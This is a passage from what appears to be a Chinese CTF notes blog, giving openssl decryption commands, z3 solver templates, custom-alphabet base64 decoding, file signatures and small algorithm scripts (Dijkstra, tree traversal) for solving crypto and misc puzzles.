class="hljs-number">5</span> ^ y &lt;&lt; <span class="hljs-number">2</span>) + (y &gt;&gt; <span class="hljs-number">3</span> ^ z &lt;&lt; <span class="hljs-number">4</span>) ^ (<span class="hljs-built_in">sum</span> ^ y) + (k[<span class="hljs-number">0</span> &amp; <span class="hljs-number">3</span> ^ e] ^ z))) &amp; <span class="hljs-number">0xffffffff</span><br>        y = v[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">sum</span> = (<span class="hljs-built_in">sum</span> - _DELTA) &amp; <span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> _long2str(v, <span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>

<h2 id="openssl解密"><a href="#openssl解密" class="headerlink" title="openssl解密"></a>openssl解密</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><ul>
<li>openssl rsautl -decrypt -inkey privatekey.key -in cipher.enc -out result</li>
</ul>
<h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><ul>
<li>openssl enc -d -aes-128-cbc -md md5 -pass pass:SevenPinLock0123456 -in flag.aes128cbc</li>
<li>openssl enc -aes-256-cbc -d -in flag.enc -out res -salt -iv xxx -K xxx</li>
</ul>
<h3 id="CSR文件"><a href="#CSR文件" class="headerlink" title="CSR文件"></a>CSR文件</h3><ul>
<li>openssl req -in file.csr -noout -text</li>
</ul>
<h2 id="openssl私钥格式"><a href="#openssl私钥格式" class="headerlink" title="openssl私钥格式"></a>openssl私钥格式</h2><p>头和尾分别需要包含这两行：</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">-----BEGIN RSA <span class="hljs-keyword">PRIVATE</span> <span class="hljs-keyword">KEY</span>-----<br>-----<span class="hljs-keyword">END</span> RSA <span class="hljs-keyword">PRIVATE</span> <span class="hljs-keyword">KEY</span>-----<br></code></pre></td></tr></table></figure>

<h2 id="批量openssl解密并合并图片"><a href="#批量openssl解密并合并图片" class="headerlink" title="批量openssl解密并合并图片"></a>批量openssl解密并合并图片</h2><p>例题：<a target="_blank" rel="noopener" href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/6%E7%BA%A7/Misc/Mysterious-GIF.md">Mysterious-GIF</a></p>
<h2 id="uncompyle6反编译pyc"><a href="#uncompyle6反编译pyc" class="headerlink" title="uncompyle6反编译pyc"></a>uncompyle6反编译pyc</h2><ul>
<li>uncompyle6 -o result.py ctf.pyc</li>
<li>uncompyle6的一个fork，可处理一些uncompyle6无法反编译的高版本pyc： <a target="_blank" rel="noopener" href="https://github.com/rocky/python-decompile3">https://github.com/rocky/python-decompile3</a></li>
</ul>
<h2 id="读取两个文件内容并xor"><a href="#读取两个文件内容并xor" class="headerlink" title="读取两个文件内容并xor"></a>读取两个文件内容并xor</h2><p>要求两个文件内容长度一致。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;a.txt&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data1=f.read()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;b.txt&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data2=f.read()<br><span class="hljs-built_in">print</span>(strxor(data1.encode(),data2.encode()))<br></code></pre></td></tr></table></figure>

<h2 id="简单z3使用"><a href="#简单z3使用" class="headerlink" title="简单z3使用"></a>简单z3使用</h2><p>z3默认只会给出一个解，如果想要全部的解可以像下面这样：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#https://stackoverflow.com/questions/13395391/z3-finding-all-satisfying-models</span><br><span class="hljs-keyword">while</span> s.check() == z3.sat:  <br>    solution = <span class="hljs-string">&quot;False&quot;</span><br>    m = s.model()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m:<br>        solution = <span class="hljs-string">f&quot;Or((<span class="hljs-subst">&#123;i&#125;</span> != <span class="hljs-subst">&#123;m[i]&#125;</span>), <span class="hljs-subst">&#123;solution&#125;</span>)&quot;</span><br>    f2 = <span class="hljs-built_in">eval</span>(solution)<br>    s.add(f2)<br></code></pre></td></tr></table></figure>

<p>例题1:<a target="_blank" rel="noopener" href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Reverse/EquationPy.md">EquationPy</a>。例题2(z3的BitVec的使用,可使用异或位移等操作):<a target="_blank" rel="noopener" href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Crypto/ezhash.md">ezhash</a></p>
<p>再给出一个求解flag的模板脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>s = []<br>s_length=<span class="hljs-number">25</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(s_length):<br>    <span class="hljs-comment">#有的时候BitVec不行可以换Int，说不定能出来。前提是没有BitVec独有的操作</span><br>    byte = BitVec(<span class="hljs-string">&quot;%s&quot;</span> % i, <span class="hljs-number">8</span>)<br>    s.append(byte)<br><br>z = Solver()<br><br><span class="hljs-comment">#这里写约束</span><br><br>flag_format = <span class="hljs-string">&quot;flag&#123;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag_format)):<br>    z.add(s[i] == <span class="hljs-built_in">ord</span>(flag_format[i]))<br><br><span class="hljs-comment"># check if all chars would be ascii printable</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag_format),s_length):<br>     z.add(s[i] &gt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;!&#x27;</span>))<br>     z.add(s[i] &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;~&#x27;</span>))<br>     <br><span class="hljs-comment"># chack if the last char would be &quot;&#125;&quot;</span><br>z.add(s[-<span class="hljs-number">1</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;&#125;&#x27;</span>))<br><br><span class="hljs-comment"># check if z3 can solve it</span><br><span class="hljs-keyword">if</span> z.check() == sat:<br>    solution = z.model()<br>    flag = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, s_length):<br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(solution[s[i]])))<br>    <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#Check if z3 can&#x27;t solve it</span><br><span class="hljs-keyword">elif</span> z.check() == unsat:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed:&quot;</span> + <span class="hljs-built_in">str</span>(z.check()))<br></code></pre></td></tr></table></figure>

<ul>
<li><a target="_blank" rel="noopener" href="https://meashiri.github.io/ctf-writeups/posts/202307-cryptoctf/#blue-office">https://meashiri.github.io/ctf-writeups/posts/202307-cryptoctf/#blue-office</a> ：Extract函数使用. <code>Extract(high, low, expr)</code>:<ul>
<li>high is the index of the highest bit to extract.</li>
<li>low is the index of the lowest bit to extract.</li>
<li>expr is the expression from which the bits are to be extracted.</li>
</ul>
</li>
</ul>
<h2 id="python3实现换表base64解密"><a href="#python3实现换表base64解密" class="headerlink" title="python3实现换表base64解密"></a>python3实现换表base64解密</h2><p>此脚本为题目<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/details?hash=ebe1d9bb-662e-4922-a257-828d58e2a4aa_2&task_category_id=6">easyjni</a>的解题脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br>data=<span class="hljs-built_in">list</span>(<span class="hljs-string">&#x27;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&#x27;</span>)<br>index=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(data),<span class="hljs-number">2</span>):<br>	data[i],data[i+<span class="hljs-number">1</span>]=data[i+<span class="hljs-number">1</span>],data[i]<br>flag=<span class="hljs-string">&#x27;&#x27;</span>.join(data[<span class="hljs-number">16</span>:]+data[:<span class="hljs-number">16</span>])<br>STANDARD_ALPHABET = <span class="hljs-string">b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br>CUSTOM_ALPHABET = <span class="hljs-string">b&#x27;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN&#x27;</span><br>DECODE_TRANS = <span class="hljs-built_in">bytes</span>.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)<br><span class="hljs-built_in">print</span>(b64decode(flag.translate(DECODE_TRANS)))<br></code></pre></td></tr></table></figure>

<p>换表后题目给出的字符不全就要用itertools爆破，比如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">import</span> itertools<br>cipher=<span class="hljs-string">b&#x27;MyLkTaP3FaA7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD==&#x27;</span><br>STANDARD_ALPHABET = <span class="hljs-string">b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.permutations(<span class="hljs-string">b&quot;ju34&quot;</span>,<span class="hljs-number">4</span>):<br>    s=<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(j) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i])<br>    CUSTOM_ALPHABET = <span class="hljs-string">b&#x27;JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs&#x27;</span>+s.encode()+<span class="hljs-string">b&#x27;kxyz012789+/&#x27;</span><br>    DECODE_TRANS = <span class="hljs-built_in">bytes</span>.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)<br>    <span class="hljs-built_in">print</span>(b64decode(cipher.translate(DECODE_TRANS)))<br></code></pre></td></tr></table></figure>

<p>例题：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[WUSTCTF2020]B@se">[WUSTCTF2020]B@se</a></p>
<h2 id="python爆破sha1值"><a href="#python爆破sha1值" class="headerlink" title="python爆破sha1值"></a>python爆破sha1值</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42967398/article/details/96492843">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>flag = <span class="hljs-string">&quot;@DBApp&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100000</span>,<span class="hljs-number">999999</span>):<br>	s = <span class="hljs-built_in">str</span>(i)+flag<br>	x = hashlib.sha1(s.encode())<br>	cnt = x.hexdigest()<br>	<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;6e32d0943418c2c&quot;</span> <span class="hljs-keyword">in</span> cnt:<br>		<span class="hljs-built_in">print</span>(cnt)<br>		<span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(i)+flag)<br></code></pre></td></tr></table></figure>

<h2 id="常见文件文件头、文件尾"><a href="#常见文件文件头、文件尾" class="headerlink" title="常见文件文件头、文件尾"></a>常见文件文件头、文件尾</h2><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/List_of_file_signatures">链接</a></p>
<p>补充：</p>
<ul>
<li>RAR文件尾：C4 3D 7B 00 40 07 00</li>
<li>jpg文件尾：FF D9</li>
<li>encrypto加密软件加密文件的文件头：4D 50 45 31(MPE1)，后缀.crypto</li>
<li><a target="_blank" rel="noopener" href="https://github.com/marcobellaccini/pyAesCrypt">pyAesCrypt</a>模块密文文件：41 45 53 02。提供一个解密脚本：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyAesCrypt<br>buffersize=<span class="hljs-number">0</span><br>password=<span class="hljs-string">&#x27;&#x27;</span><br>pyAesCrypt.decryptFile(<span class="hljs-string">&quot;cipher.enc&quot;</span>,<span class="hljs-string">&quot;plain&quot;</span>,password,buffersize)<br></code></pre></td></tr></table></figure>

<ul>
<li>png文件尾:AE 42 60 82</li>
<li>rec后缀文件，文件头<code>AMR#</code>,strings这类文件可得到<a target="_blank" rel="noopener" href="https://automacrorecorder.com/">Auto Mouse Recorder</a>。可以用官网下载软件播放该文件</li>
<li><a target="_blank" rel="noopener" href="https://github.com/M0R1AR7Y/Writeups/tree/main/MAPNA%202024/JigBoy">JigBoy</a><ul>
<li>JBIG（后缀<code>jbg</code>,<code>jbg2</code>）文件头：<code>97 4A 42 32 0D 0A 1A 0A</code></li>
<li>其他wp： <a target="_blank" rel="noopener" href="https://github.com/Jonnen98cool/CTF_writeups/blob/main/mapna_ctf_2024/JigBoy.md">https://github.com/Jonnen98cool/CTF_writeups/blob/main/mapna_ctf_2024/JigBoy.md</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Apzyte-Gamer/MapnaCTF-2024/tree/main/Forensics/XXG">XXG</a><ul>
<li>gimp xcf文件分析。注意xcf文件的版本过高也会导致文件无法打开。一般用的是v011</li>
<li>详细文件头格式参考 <a target="_blank" rel="noopener" href="https://developer.gimp.org/core/standards/xcf/#header">https://developer.gimp.org/core/standards/xcf/#header</a></li>
</ul>
</li>
<li>MFT文件头：<code>FILE0</code></li>
</ul>
<h2 id="C语言格式化字符串参考"><a href="#C语言格式化字符串参考" class="headerlink" title="C语言格式化字符串参考"></a>C语言格式化字符串参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/chenmozhe22/article/details/109738852">链接</a></p>
<h2 id="serpent分组加密算法"><a href="#serpent分组加密算法" class="headerlink" title="serpent分组加密算法"></a>serpent分组加密算法</h2><p>详情见大佬<a target="_blank" rel="noopener" href="https://blog.csdn.net/douqingl/article/details/50256931">博客</a>。可使用<a target="_blank" rel="noopener" href="https://www.tools4noobs.com/online_tools/decrypt/">在线网站</a>直接解密。</p>
<h2 id="exif查看"><a href="#exif查看" class="headerlink" title="exif查看"></a>exif查看</h2><p>misc或者osint题型中，可能会有信息藏在exif头中。使用<a target="_blank" rel="noopener" href="https://exif.tools/upload.php">在线工具</a>查看。</p>
<h2 id="dijkstra最短路径寻路算法"><a href="#dijkstra最短路径寻路算法" class="headerlink" title="dijkstra最短路径寻路算法"></a>dijkstra最短路径寻路算法</h2><p>例题：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%E6%95%91%E4%B8%96%E6%8D%B7%E5%BE%84">救世捷径</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#dijkstra算法</span><br>graph=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">27</span>):<br>    graph.append([])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">27</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">27</span>):<br>        graph[i].append(<span class="hljs-number">0x3f3f3f</span>)<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dj.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).readlines()<span class="hljs-comment">#这里需要手动将原文中的最后一行换行给去掉</span><br>li=[]<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> f:<br>    li.append(x.strip().split(<span class="hljs-string">&#x27; &#x27;</span>))<br><span class="hljs-comment">#print(li)</span><br><span class="hljs-comment">#print(graph)</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> li:<br>    graph[<span class="hljs-built_in">int</span>(x[<span class="hljs-number">0</span>])][<span class="hljs-built_in">int</span>(x[<span class="hljs-number">1</span>])]=<span class="hljs-built_in">int</span>(x[<span class="hljs-number">2</span>])<br>    graph[<span class="hljs-built_in">int</span>(x[<span class="hljs-number">1</span>])][<span class="hljs-built_in">int</span>(x[<span class="hljs-number">0</span>])]=<span class="hljs-built_in">int</span>(x[<span class="hljs-number">2</span>])<br><span class="hljs-comment">#print(graph)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dijkstra</span>():<br>    dv=[<span class="hljs-number">0x3f3f3f</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">27</span>)]<span class="hljs-comment">#点i到起点1的最短距离</span><br>    route=[<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">27</span>)]<span class="hljs-comment">#记录每点和与它对应的上一点</span><br>    vis=[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">27</span>)]<span class="hljs-comment">#各点到起点的最短距离是否已定.</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">27</span>):<br>        dv[i]=graph[i][<span class="hljs-number">1</span>]<br>    dv[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span><br>    <span class="hljs-comment">#print(dv)</span><br>    vis[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>        minn=<span class="hljs-number">0x3f3f3f</span><br>        temp=-<span class="hljs-number">1</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">27</span>):<br>            <span class="hljs-keyword">if</span> vis[j]==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> minn&gt;dv[j]:<br>                minn=dv[j]<br>                temp=j<br>        vis[temp]=<span class="hljs-number">1</span><br>        <span class="hljs-comment">#print(temp)</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">27</span>):<br>            <span class="hljs-keyword">if</span> dv[j]&gt;dv[temp]+graph[temp][j]:<br>                dv[j]=dv[temp]+graph[temp][j]<br>                route[j]=temp<br>    <span class="hljs-keyword">return</span> (route,dv)<br>route,dv=dijkstra()<br><span class="hljs-built_in">print</span>(dv[<span class="hljs-number">26</span>])<br><span class="hljs-built_in">print</span>(route)<br>y=<span class="hljs-number">26</span><br><span class="hljs-keyword">while</span> y!=<span class="hljs-number">1</span>:<br>    <span class="hljs-built_in">print</span>(y)<span class="hljs-comment">#这里输出路径</span><br>    y=route[y]<br></code></pre></td></tr></table></figure>

<h2 id="多重base编码解密脚本"><a href="#多重base编码解密脚本" class="headerlink" title="多重base编码解密脚本"></a>多重base编码解密脚本</h2><p>有时候会遇到base编码疯狂套娃，手动放工具里都要点击解密很多次，不如直接脚本自动化。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span> (<span class="hljs-string">r&#x27;flag_encode.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">try</span> :<br>                a=base64.b64decode(a).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br>            <span class="hljs-keyword">try</span>:<br>                a=base64.b32decode(a).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br>            <span class="hljs-keyword">try</span>:<br>                a=base64.b16decode(a).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#123;&quot;</span> <span class="hljs-keyword">in</span> a:<br>                <span class="hljs-built_in">print</span> (a)<br>                <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<h2 id="字频统计脚本"><a href="#字频统计脚本" class="headerlink" title="字频统计脚本"></a>字频统计脚本</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109377328">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">alphabet = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span><br>strings = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>).read()<br><br>result = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> alphabet:<br>	counts = strings.count(i)<br>	i = <span class="hljs-string">&#x27;&#123;0&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i)<br>	result[i] = counts<br><br>res = <span class="hljs-built_in">sorted</span>(result.items(),key=<span class="hljs-keyword">lambda</span> item:item[<span class="hljs-number">1</span>],reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> res:<br>	<span class="hljs-built_in">print</span>(data)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:<br>	flag = <span class="hljs-built_in">str</span>(i[<span class="hljs-number">0</span>])<br>	<span class="hljs-built_in">print</span>(flag[<span class="hljs-number">0</span>],end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>

<h2 id="二叉树遍历"><a href="#二叉树遍历" class="headerlink" title="二叉树遍历"></a>二叉树遍历</h2><h3 id="根据中序-后序遍历结果获取先序遍历结果"><a href="#根据中序-后序遍历结果获取先序遍历结果" class="headerlink" title="根据中序+后序遍历结果获取先序遍历结果"></a>根据中序+后序遍历结果获取先序遍历结果</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ToPreOrder</span>(<span class="hljs-params">Postorder,Inorder</span>):<br>    length = <span class="hljs-built_in">len</span>(Postorder)<br>    <span class="hljs-keyword">if</span> length == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    root = Postorder[length-<span class="hljs-number">1</span>] <span class="hljs-comment">#根节点　</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<span class="hljs-comment">#找到中序遍历中根节点的位序</span><br>        <span class="hljs-keyword">if</span> root == Inorder[i]:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(root,end=<span class="hljs-string">&quot;&quot;</span>)<br>    ToPreOrder(Postorder[<span class="hljs-number">0</span>:i],Inorder[<span class="hljs-number">0</span>:i]) <span class="hljs-comment">#递归，传入左子树的后序和中序遍历序列</span><br>    ToPreOrder(Postorder[i:length-<span class="hljs-number">1</span>],Inorder[i+<span class="hljs-number">1</span>:length])<span class="hljs-comment">#递归，传入右子树的后序和中序遍历序列</span><br></code></pre></td></tr></table></figure>

<h3 id="根据前序-中序遍历结果获取后序遍历结果"><a href="#根据前序-中序遍历结果获取后序遍历结果" class="headerlink" title="根据前序+中序遍历结果获取后序遍历结果"></a>根据前序+中序遍历结果获取后序遍历结果</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ao52426055/article/details/110420027">例题及来源</a></p>
